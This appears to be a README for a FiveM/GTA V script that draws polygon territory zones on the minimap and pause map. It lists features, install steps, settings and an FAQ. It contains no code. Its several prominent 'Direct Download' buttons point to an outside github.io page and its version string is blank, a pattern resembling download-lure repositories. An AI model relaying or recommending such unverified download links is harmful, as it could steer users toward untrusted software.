# zoneoverlay v - Game Script Utility 2026

> **FiveM zone overlay utility for GTA V.** Draws colored polygon territory markers on the minimap and pause map, with built-in editing tools for managing zones in game.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carterlucaslr3618/zoneoverlay-gta-v-script?style=flat-square)](https://github.com/carterlucaslr3618/zoneoverlay-gta-v-script)

---

<p align="center">
  <a href="https://carterlucaslr3618.github.io/zoneoverlay-gta-v-script/">
    <img src="https://img.shields.io/badge/Download-zoneoverlay%20Script-brightgreen?style=for-the-badge" alt="Download zoneoverlay Script">
  </a>
</p>

> **[Direct Download - zoneoverlay](https://carterlucaslr3618.github.io/zoneoverlay-gta-v-script/)**

---

[Download Latest Build](https://carterlucaslr3618.github.io/zoneoverlay-gta-v-script/)

---

## What it does

zoneoverlay is a FiveM resource for GTA V servers that need clear zone visibility on both the minimap and pause map. It is centered on territory-style polygon overlays and gives you a straightforward way to define areas, adjust how they look, and preserve them between sessions.

An in-game editor is included for creating, changing, moving, and deleting zones without depending on external artwork. Zone information is saved in JSON and kept in sync across clients, and Lua exports make it simple to tie the overlay system into other scripts or gameplay systems.

---

## Features

- Colored polygon overlays for the minimap and pause map
- In-game panel for creating, editing, moving, and deleting zones
- Runtime texture generation, so no external image files are required
- JSON-based storage for zone data with auto-sync across connected clients
- Multiple zones with separate color and opacity settings
- Lua exports for integration with other scripts
- Designed for territory, control, or area-marking use cases
- Built around FiveM and GTA V map presentation

---

## Installation

1. Download the repository files and place them in your FiveM resources folder.
2. Make sure the resource folder name matches the project folder you want to use, such as `zoneoverlay-gtav`.
3. Add the resource to your server start order.
4. Start the resource and open the in-game panel to create or manage zones.

Example server config entry:

    ensure zoneoverlay-gtav

If you plan to connect this resource with other scripts, use the provided Lua exports from your own resource code.

---

## Configuration

A complete option set will vary based on your server setup, but the main controls are focused on zone editing and how each area is displayed.

| Setting | Purpose |
| --- | --- |
| Zone color | Choose the display color for each polygon |
| Opacity | Adjust how strongly a zone appears on the map |
| Edit mode | Enable moving or reshaping existing zones |
| Delete action | Remove a saved zone from storage |
| JSON sync | Keep zone definitions aligned across clients |

If you want to surface controls through commands, keybinds, or a custom admin UI, connect them to the editor workflow and Lua exports provided by the resource.

---

## Compatibility

- Platform: FiveM
- Game: GTA V
- Map targets: minimap and pause map
- Storage format: JSON

Known limits:

- Zone management depends on the in-game editor workflow
- Visual results can vary with map scale, server UI setup, and client-side configuration
- Any custom integration should be tested against your own resource order and sync logic

---

## FAQ

**How do I install it?**  
Put the resource into your server resources directory, add it to your start list, and make sure the folder name matches your setup.

**How do I update it?**  
Swap in the newer resource files, then restart or refresh the resource on your server.

**Can I change zone colors or transparency?**  
Yes. The resource supports separate color and opacity settings for different zones.

**Does it require external images?**  
No. The overlay textures are generated at runtime.

**Where are zones saved?**  
Zone definitions are stored in JSON for persistence and synchronization.

**Can other scripts use it?**  
Yes. Lua exports are included for script-to-script integration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
